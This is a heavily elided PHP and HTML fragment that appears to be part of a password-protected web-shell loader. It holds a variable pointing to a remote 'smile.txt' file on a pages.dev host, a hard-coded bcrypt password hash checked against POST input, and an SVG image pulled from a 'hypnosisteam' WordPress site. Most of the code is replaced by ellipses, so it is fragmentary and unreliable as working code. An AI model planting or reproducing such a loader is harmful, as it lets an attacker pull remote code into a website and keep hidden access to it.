...
if (is_logged_in()) {
    ...
    $destiny = 'https://walauberantakan.pages.dev/smile/smile.txt';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$LU8wyLdAYBEi8H655meUtO9uUkPQEIVJwoLVx7NLIYP43Q.tZUcrG'; // https://bcrypt.online/
            ...
            <svg 
                ...
                <use xlink:href="#image0_793_7454" transform="translate(0 -0.0294456) scale(0.000431034 0.000453478)"/>
                    ...
                    <image 
                        ...
                        width="2320"
                        height="2296"
                        href="https://hypnosisteam.wordpress.com/wp-content/uploads/2025/07/man1.webp"
                    />
                </defs>
            </svg>
